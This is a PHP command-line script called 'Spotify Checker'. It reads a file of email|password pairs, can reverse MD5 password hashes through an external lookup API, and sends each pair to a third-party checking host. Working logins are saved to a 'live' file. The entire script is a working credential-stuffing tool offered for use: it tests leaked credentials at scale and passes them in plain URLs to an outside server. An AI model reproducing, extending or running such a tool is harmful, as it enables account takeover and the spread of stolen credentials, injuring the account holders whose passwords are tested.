<?php
ob_implicit_flush(true);
error_reporting(0);
function in_string($s,$as) {
	$s=strtoupper($s);
	if(!is_array($as)) $as=array($as);
	for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
	return false;
}
echo "============================================\n";
echo "              Spotify Checker "; 
echo "\n============================================\n";
echo "Created by : \033[92mmbul48 \n\033[0mAPI From   : \033[95mmbul48 \033[0m\nInstagram  : mbul48\n";
echo "============================================\n";

echo "Apikey \t\t: ";
$apikey = trim(fgets(STDIN));

echo "List \t\t: ";
$list = trim(fgets(STDIN));

echo "Sleep \t\t: ";
$tidur = trim(fgets(STDIN));
$date = date("h:i:sa");
$file = file_get_contents("$list");
$data = explode("\n",$file);
$jumlah= 0; $live=0; $mati=0;
for($a=0;$a<count($data);$a++){
        $data1 = explode("|",$data[$a]);
        $email = $data1[0];
        $pass = $data1[1];
	if($argv[2]=="--md5"){
		$get = @file_get_contents("https://lea.kz/api/hash/$pass");
		$json = json_decode($get,true);
		$pass = $json['password'];
	}
	$cek = @file_get_contents("https://hello-rexxxz.c9users.io/index.php?email=$email&pass=$pass&apikey=$apikey");
	if (strpos($cek,"Spotify")) {
 if(!in_array($cek,explode("\n",@file_get_contents("spotify-live.txt")))){
  $h=fopen("spotify-live.txt","a");
  fwrite($h,$cek."\n");
  fclose($h);
  }
		echo "\033[95m [" . $date . "]\033[0m"; $cek = "\033[92m [Live] \033[0m".$cek; $live+=1;
  }else{
		echo "\033[95m [" . $date . "]\033[0m"; $cek = "\033[91m [Diee] \033[0m".$cek; $mati+=1;
	}
	ob_flush();
	sleep($tidur);
   print($cek."\n");
}
	echo "============================================\n";
	print ("Account \033[1;34mChecked : " . count($data). "\033[0m\n");
	echo "Account \033[92mLive: $live \033[0mand account \033[91mDie: $mati\033[0m \n";
	echo "\033[92mE\033[0m\033[93mN\033[0m\033[94mJ\033[0m\033[95mO\033[0m\033[96mY\033[0m\033[91mY\033[0m\n";

?>
